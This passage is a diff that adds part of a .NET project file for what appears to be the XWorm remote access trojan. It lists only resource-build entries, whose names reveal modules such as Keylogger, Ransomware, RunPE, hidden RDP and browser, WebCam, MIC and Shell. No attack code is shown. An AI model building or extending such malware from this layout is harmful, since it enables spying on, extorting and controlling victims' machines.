+      <LastGenOutput>XWorm.HApps.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Hash.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Hash.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HBrowser.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.HBrowser.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Hosts.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Hosts.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HRDP.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.HRDP.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.INFO.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.INFO.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Keylogger.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Keylogger.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Main.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Main.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Maps.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Maps.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.MBox.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.MBox.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.MIC.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ngrok.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ngrok.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Performance.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Performance.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Port.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Port.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ProcessV.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ProcessV.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Programs.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Programs.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Proxy.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Proxy.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Ransomware.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Ransomware.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Registry.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Registry.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.RunPE.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.RunPE.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ServiceManager.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ServiceManager.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Shell.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Shell.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Sound.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Sound.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.StartupManager.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.StartupManager.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TBotNotify.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.TBotNotify.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TcpConnectionForm.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.TcpConnectionForm.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ToolsBox.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ToolsBox.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TXT.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.WebCam.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace>ResXFileCodeGenerator</CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.WebCam.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+</Project>
